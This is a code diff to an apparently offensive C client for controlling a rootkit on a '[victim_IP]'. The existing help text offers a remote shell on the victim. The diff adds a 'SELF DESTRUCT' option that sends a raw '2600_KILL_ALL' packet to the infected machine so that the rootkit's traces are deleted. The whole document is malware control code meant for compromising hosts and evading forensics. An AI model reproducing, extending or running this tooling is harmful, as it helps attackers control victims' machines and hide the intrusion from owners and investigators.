@@ -25,6 +25,11 @@ void print_help_dialog(const char* arg){
     line = "-u";
     desc = "Get a remote shell to [victim_IP] from local private IP(198.168.* or 10.* or 172.*) with custom [local_Port]";
     printf("\t%-40s %-50s\n\n", line, desc);
+    line = "-i";
+    desc = "Delete any traces of rootkit on the [victim_IP]";
+    printf("\t%-40s %-50s\n\n", line, desc);
+
+
 }
 
 void check_ip_address_format(char* address){
@@ -182,6 +187,23 @@ void get_shell_with_custom_port(char* dest_address, char* dest_port) {
 }
 
 
+void no_trace(char* argv){
+    printf("["KBLU"INFO"RESET"]""HELLOe...\n");
+    char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
+    packet_t packet = build_standard_packet(2600, 2600, local_ip, argv, 2048, "2600_KILL_ALL");
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+    }else{
+        printf("["KGRN"OK"RESET"]""Request to hide successfully sent!\n");
+    }
+    free(local_ip);
+}
+
+
 void main(int argc, char* argv[]){
     if(argc<2){
         printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
@@ -196,7 +218,7 @@ void main(int argc, char* argv[]){
     char dest_port[16];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:u:i:p:e:d:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:u:i:")) != -1) {
         switch (opt) {
         case 'S':
             print_welcome_message();
@@ -228,6 +250,15 @@ void main(int argc, char* argv[]){
                 optind++; // Move to the next argument
             }
             get_shell_with_custom_port(dest_address, dest_port);
+            break;
+        case 'i':
+            print_welcome_message();
+            sleep(1);
+            //Get a shell mode
+            printf("["KBLU"INFO"RESET"]""Activated SELF DESTRUCT\n");
+            //printf("Option S has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            no_trace(dest_address);
             break;
         }
     }
